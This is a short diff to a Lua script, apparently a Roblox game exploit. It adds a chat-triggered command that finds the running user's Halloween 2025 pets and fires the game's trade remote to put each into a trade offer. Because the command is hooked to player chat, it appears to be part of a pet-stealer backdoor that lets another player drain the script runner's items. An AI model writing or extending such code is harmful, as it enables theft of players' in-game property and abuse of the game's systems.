@@ -61,6 +61,15 @@ function onPlayerChatted(player)
 					end
 				end
 			end
+
+if message == prefix.."add hallo " then
+				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
+					if v["kind"] == "halloween_2025_dj_snooze" or v["kind"] == "halloween_2025_ghostly_cat" or v["kind"] == "halloween_2025_bat_cat" then
+						wait()
+						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+					end
+				end
+			end
 			
 			if string.sub(message, 1, #prefix + 6) == prefix.."whohas" then
 				for i, v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
